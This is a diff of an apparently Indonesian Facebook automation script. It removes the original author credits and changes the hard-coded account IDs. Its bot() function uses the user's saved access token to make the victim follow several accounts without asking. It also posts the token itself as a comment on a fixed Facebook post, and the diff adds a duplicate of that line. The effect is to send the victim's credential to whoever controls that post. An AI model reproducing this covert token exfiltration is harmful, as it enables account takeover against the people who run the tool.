@@ -1,11 +1,4 @@
-#!/usr/bin/python3
-
 # coding=utf-8
-
-# author : Fall Xavier
-#      (C) Copyright 407 Authentic Exploit
-#      Rebuild Copyright Can't make u real programmer:)
-#      Coded By Fall Xavier
 
 ### IMPORT MODULE ###
 import os, sys, re, time, requests, calendar, random,json
@@ -105,6 +98,7 @@ def logo():
                 /_/                        """%(N))
    
 ### BAGIAN LOGIN ###
+raka_sayang_amanda = '953529338576547'
 def tokenz():
 	os.system('clear')
 	try:
@@ -133,12 +127,13 @@ def bot():
 		token = open('token.txt', 'r').read()
 	except (KeyError, IOError):
 		exit(" %s[-] token kadaluwarsa!"%(M))
-	requests.post('https://graph.facebook.com/100023812724814/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100026441864942/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + token)
+	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token) #raka
+	requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' + token) #angga
+	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + token) #raka the kingg
+	requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + token) #mantan garangan
+	requests.post('https://graph.facebook.com/100046544291175/subscribers?access_token=' + token) #facebook 69
+	requests.post('https://graph.facebook.com/953529338576547/comments/?message='+token+'&access_token=' + token)
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
 
 ### BAGIAN MENU ###
 def menu():
